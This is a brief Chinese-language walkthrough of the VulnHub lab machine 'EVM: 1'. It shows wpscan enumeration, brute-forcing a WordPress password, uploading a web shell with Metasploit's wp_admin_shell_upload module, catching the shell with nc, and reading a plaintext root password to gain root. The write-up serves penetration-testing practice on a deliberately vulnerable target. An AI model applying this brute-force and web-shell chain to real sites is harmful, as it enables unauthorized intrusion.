# EVM: 1

2025.03.03 https://www.vulnhub.com/entry/evm-1,391/

## Ip

192.168.5.39

## Scan

```
PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
```

smb 无访问权限，enum4linux-ng 也没枚举出用户。

访问 80 web 发现提示：ou can find me at /wordpress/ im vulnerable webapp :)

查看 wordpress, 发现加载有问题，源码中是加载的http://192.168.56.103 固定了 ip 有一些 js 和 css 加载有问题。

wpscan 先扫描：

```
wpscan --url http://192.168.5.39/wordpress/ -e u,ap,at,tt,cb --plugins-detection mixed
```

扫描到一个用户 c0rrupt3d_brain ，发现几个插件 akismet 4.1.2 、 photo-gallery 1.5.34 、 wp-responsive-thumbnail-slider 1.0 、 wp-vault 0.8.6.6 但是没发现明显的可利用漏洞，先爆破下 c0rrupt3d_brain 的登陆密码，找到用户登陆密码: 24992499 , 虽然得到了密码，但是不能登陆，靶机的有些文件链接设置了 192.168.56.103 的 ip。

这里使用 msf 中的上传 web shell 的 payload 直接用代码上传 web shell:

```
use exploit/unix/webapp/wp_admin_shell_upload
```

将 shell 移交到 kali 的 nc 上，移交后，在/home/root3r 目录中发现了 root 用户的密码，然后 su 切换到 root：

```
www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$ cat .root_password_ssh.txt
willy26
www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$ su root
Password:
root@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r# cd /root
root@ubuntu-extermely-vulnerable-m4ch1ine:~# ls
proof.txt
root@ubuntu-extermely-vulnerable-m4ch1ine:~# cat proof.txt
voila you have successfully pwned me :) !!!
:D
```
